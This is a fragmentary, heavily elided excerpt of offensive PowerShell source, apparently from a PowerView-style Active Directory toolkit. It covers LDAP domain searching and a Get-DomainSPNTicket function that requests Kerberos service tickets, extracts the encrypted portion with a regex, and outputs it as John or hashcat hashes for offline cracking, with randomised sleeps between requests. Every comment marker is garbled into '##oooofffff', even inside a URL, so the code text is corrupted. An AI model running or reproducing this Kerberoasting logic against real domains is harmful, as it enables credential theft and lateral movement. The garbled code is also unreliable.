...
function Get-DomainSearcher {
    ...
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ...
            ##oooofffff if not -Domain is specified, retrieve the current domain name
        ...
        if (-not $PSBoundParameters['Server']) {
            ##oooofffff if there's not a specified server to bind to, try to pull the current domain PDC
            try {
                if ($DomainObject) {
        ...
        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                ##oooofffff if we're searching the global catalog, get the path in the right format
            ...
            ##oooofffff transform the target domain name into a distinguishedName if an ADS search base is not specified
        ...
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            ...
            ##oooofffff bind to the inital search object using alternate credentials
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            ##oooofffff bind to the inital object using the current credentials
        ...
        if ($PSBoundParameters['Properties']) {
            ##oooofffff handle an array of properties to load w/ the possibility of comma-separated strings
    ...
    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                ##oooofffff convert all listed sids (i.e. if multiple are listed in sidHistory)
            ...
            elseif ($_ -eq 'objectguid') {
                ##oooofffff convert the GUID to a string
            ...
            elseif ($_ -eq 'ntsecuritydescriptor') {
                ##oooofffff $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
            ...
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                ##oooofffff convert timestamps
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    ##oooofffff if we have a System.__ComObject
                    $Temp = $Properties[$_][0]
                    ...
                    ##oooofffff otherwise just a string
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                ##oooofffff try to convert misc com objects
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
    ...
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            ...
            if ($PSBoundParameters['Domain']) {
                ...
                ##oooofffff if no domain is supplied, extract the logon domain from the PSCredential passed
...
function Get-DomainSPNTicket {
	...
	$RandNo = New-Object System.Random
        ...
        ForEach ($Object in $TargetObject) {
            ...
            ##oooofffff if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
            ...
            if ($TicketByteStream) {
                ...
                ##oooofffff TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121##oooofffffsection-4.1)
                ##oooofffff No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    ##oooofffff Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                ...
                if($Hash) {
                    if ($OutputFormat -match 'John') {
                        ...
                        ##oooofffff hashcat output format
            ...
            ##oooofffff sleep for our semi-randomized interval
    ...
    PROCESS {
        ...
        if ($UserSearcher) {
            ...
            $Identity | Where-Object {$_} | ForEach-Object {
                ...
                elseif ($IdentityInstance -match '^CN=') {
                    ...
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        ##oooofffff if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        ##oooofffff   and rebuild the domain searcher
            ...
            if ($PSBoundParameters['AllowDelegation']) {
                ...
                ##oooofffff negation of "Accounts that are sensitive and not trusted for delegation"
            ...
            ##oooofffff build the LDAP filter for the dynamic UAC filter value
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    ##oooofffff return raw result objects
                    $User = $_
